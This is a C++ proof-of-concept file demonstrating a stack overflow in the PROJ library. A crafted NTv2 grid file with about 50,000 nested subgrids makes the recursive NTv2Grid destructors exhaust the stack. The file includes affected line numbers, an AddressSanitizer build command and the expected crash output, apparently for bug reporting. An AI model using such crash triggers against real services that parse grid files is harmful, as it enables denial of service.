/*
 * PoC for SF10: Stack overflow via deeply nested NTv2 grid hierarchy.
 *
 * The NTv2GridSet::open() parser builds a tree of NTv2Grid objects where
 * each grid stores its children in m_children (vector<unique_ptr<HorizontalShiftGrid>>).
 * With N levels, this creates a linear chain of N nested objects.
 *
 * When the NTv2GridSet is destroyed, ~NTv2Grid() cascades N levels deep:
 *   ~NTv2Grid() -> ~HorizontalShiftGrid() -> ~vector(m_children) ->
 *   -> ~unique_ptr -> ~NTv2Grid() [child] -> ... (N times)
 *
 * The same recursive pattern affects HorizontalShiftGrid::gridAt() used
 * during coordinate transformation lookups.
 *
 * Affected file: PROJ/src/grids.cpp
 * - NTv2Grid class (line ~2081) - no recursion depth limit in destructor
 * - HorizontalShiftGrid::gridAt() (line ~2763) - recursive child traversal
 * - NTv2GridSet::open() (line ~2183) - builds unbounded nested hierarchy
 *
 * Prerequisite: generate sf10_deep.gsb with grids_SF10_poc_gen.py
 *
 * Compile:
 *   clang++ -std=c++17 -fsanitize=address -g -O1 \
 *     -I/src/PROJ/include -I/src/PROJ/src \
 *     grids_SF10_poc.cpp \
 *     /proj4-build/lib/libproj.a \
 *     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm \
 *     -o poc_sf10
 *   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./poc_sf10 sf10_deep.gsb
 *
 * Expected output:
 *   AddressSanitizer:DEADLYSIGNAL
 *   ==PID==ERROR: AddressSanitizer: stack-overflow on address ...
 *       #N in osgeo::proj::NTv2Grid::~NTv2Grid()
 *       #N in osgeo::proj::HorizontalShiftGrid::~HorizontalShiftGrid()
 */

#include <stdio.h>
#include <string.h>
#include <sys/resource.h>
#include <proj.h>

int main(int argc, char *argv[]) {
    const char *gridfile = argc > 1 ? argv[1] : "sf10_deep.gsb";

    printf("SF10 PoC: Recursive destructor stack overflow in NTv2Grid\n");
    printf("Grid file: %s\n", gridfile);
    fflush(stdout);

    /*
     * Reduce stack to 1MB to trigger crash on fewer recursion levels.
     * The bug exists at default 8MB stack too - just needs more grid depth.
     * With 50000 levels and 8MB stack, the crash occurs during destructors.
     */
    struct rlimit rl;
    getrlimit(RLIMIT_STACK, &rl);
    printf("Default stack: %lu bytes\n", (unsigned long)rl.rlim_cur);
    rl.rlim_cur = 1024 * 1024; /* 1MB */
    if (setrlimit(RLIMIT_STACK, &rl) == 0) {
        printf("Stack limited to 1MB for demonstration\n");
    }
    fflush(stdout);

    PJ_CONTEXT *ctx = proj_context_create();
    if (!ctx) {
        fprintf(stderr, "Failed to create PROJ context\n");
        return 1;
    }

    /*
     * proj_grid_info() opens the NTv2GridSet which builds the deep chain.
     * The crash occurs when the gridset goes out of scope and ~NTv2Grid()
     * recurses through 50000 nested m_children entries.
     */
    PJ_GRID_INFO info = proj_grid_info(gridfile);
    printf("Grid format: %s\n", info.format);

    proj_context_destroy(ctx);

    /*
     * At this point, the temporary NTv2GridSet created inside proj_grid_info()
     * has already been destroyed (it's a local unique_ptr in the function).
     * The destructor call chain crashes before reaching here when the stack
     * is insufficient for 50000 levels of recursion.
     */
    printf("EXPECTED: Should have crashed above with stack-overflow!\n");
    return 1;
}
